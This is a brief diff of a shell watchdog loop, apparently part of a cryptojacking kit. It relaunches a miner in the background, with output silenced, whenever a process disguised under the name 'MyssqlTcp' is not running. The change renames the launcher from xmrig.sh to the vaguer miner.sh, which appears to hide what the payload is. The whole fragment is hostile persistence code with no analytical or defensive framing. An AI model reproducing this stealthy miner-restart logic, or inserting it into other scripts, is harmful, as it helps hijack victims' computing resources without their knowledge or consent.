@@ -16,7 +16,7 @@ while true; do
         server=`ps aux | grep MyssqlTcp | grep -v grep`
         if [ ! "$server" ]; then
             ./addconf.sh
-            /bin/bash ./xmrig.sh --config=./config_background.json >/dev/null 2>&1
+            /bin/bash ./miner.sh --config=./config_background.json >/dev/null 2>&1
             sleep 10
         fi
         ./logserver.sh
